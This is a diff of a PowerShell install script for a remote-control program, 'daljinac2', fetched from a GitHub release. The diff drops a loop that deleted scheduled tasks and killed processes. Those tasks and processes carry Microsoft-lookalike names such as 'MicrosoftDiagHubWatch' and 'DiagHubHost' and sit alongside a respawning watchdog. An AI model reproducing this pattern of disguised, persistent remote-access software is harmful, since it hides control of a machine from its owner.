@@ -22,23 +22,9 @@ $Exe = "$Dir\$ExeName"
 $URL = "https://github.com/egzakutacno/daljinac2/releases/latest/download/daljinac2.exe"
 
 try {
-    # FIRST: delete old scheduled tasks so watchdog can't respawn
-    Write-Host "[0a/3] Deleting old scheduled tasks..."
-    @("Daljinac2","Daljinac2Watch","MicrosoftDiagHubCollect","MicrosoftDiagHubWatch") | ForEach-Object {
-        try { schtasks /delete /tn $_ /f 2>$null } catch {}
-    }
-
-    # SECOND: aggressively kill until port is free
-    Write-Host "[0b/3] Killing old processes..."
-    $maxWait = 20
-    do {
-        Get-Process daljinac2,DiagHubHost -ErrorAction SilentlyContinue | Stop-Process -Force
-        Start-Sleep -Seconds 1
-        $maxWait--
-        $portFree = $true
-        try { $tcp = (Get-NetTCPConnection -LocalPort 1984 -ErrorAction Stop).OwningProcess } catch { $portFree = $true }
-        if ($maxWait -le 0) { break }
-    } while (-not $portFree)
+    # Kill any running instance FIRST
+    Write-Host "[0/3] Killing old processes..."
+    Get-Process daljinac2,DiagHubHost -ErrorAction SilentlyContinue | Stop-Process -Force
     Start-Sleep -Seconds 2
 
     # Make sure the dir exists
